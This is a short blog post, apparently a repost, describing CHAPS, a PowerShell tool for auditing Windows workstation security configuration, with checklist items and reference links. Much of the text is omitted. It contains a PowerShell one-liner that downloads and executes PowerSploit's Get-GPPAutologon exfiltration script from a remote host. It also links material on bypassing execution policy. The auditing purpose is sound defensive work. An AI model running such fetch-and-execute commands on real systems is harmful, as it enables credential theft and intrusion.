---
title: 'CHAPS'
date: 2020-01-28T23:33:00+01:00
draft: false
---

**Kang Asu**

[![](https://1.bp.blogspot.com/-4jpo9oSiM4I/XhU5jily9xI/AAAAAAAARZI/nNw8oUrcLMAq1qKFYmtnY6K5vaOODO-vQCNcBGAsYHQ/s640/SCM-Workstation.png)](https://1.bp.blogspot.com/-4jpo9oSiM4I/XhU5jily9xI/AAAAAAAARZI/nNw8oUrcLMAq1qKFYmtnY6K5vaOODO-vQCNcBGAsYHQ/s1600/SCM-Workstation.png)
...
IEX (New-Object Net.WebClient).DownloadString('http://:8181/PowerSploit/Exfiltration/Get-GPPAutologon.ps1')  
...
*   Run the systeminfo command to get system information to run the [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng "Windows Exploit Suggester - Next Generation") tool.
...
*   Disable Net Session Enumeration
    *   **NOTE**: For now, extra actions are required to test this. See: [TechNet script NetSessEnumPerm.ps1](https://gallery.technet.microsoft.com/scriptcenter/View-Net-Session-Enum-dfced139 "TechNet script NetSessEnumPerm.ps1")
*   Disable WPAD
...
*   Issues
    *   WMI remoting and firewall rules may be required by [Vulnerability](https://www.kitploit.com/search/label/Vulnerability "Vulnerability") scanning tools. Thus, if enabled, test for limiting to users and specific systems.
...
*   [Securing Windows Workstations: Developing a Secure Baseline](https://adsecurity.org/?p=3299 "Securing Windows Workstations: Developing a Secure Baseline")
*   [Windows ](http://www.fuzzysecurity.com/tutorials/16.html "Windows ")[Privilege Escalation](https://www.kitploit.com/search/label/Privilege%20Escalation "Privilege Escalation") Fundamentals
*   [New tool: Policy Analyzer](https://blogs.technet.microsoft.com/secguide/2016/01/22/new-tool-policy-analyzer/ "New tool: Policy Analyzer")
*   [Use PowerShell to Explore ](https://blogs.technet.microsoft.com/heyscriptingguy/2012/03/12/use-powershell-to-explore-active-directory-security/ "Use PowerShell to Explore ")[Active Directory](https://www.kitploit.com/search/label/Active%20Directory "Active Directory") Security
*   [Penetration Testers’ Guide to Windows 10 Privacy & Security](https://hackernoon.com/the-2017-pentester-guide-to-windows-10-privacy-security-cf734c510b8d "Penetration Testers’ Guide to Windows 10 Privacy & Security")
*   [15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ "15 Ways to Bypass the PowerShell Execution Policy")
...
**[Download Chaps](http://ellevolaw.com/3sdH "Download Chaps")**
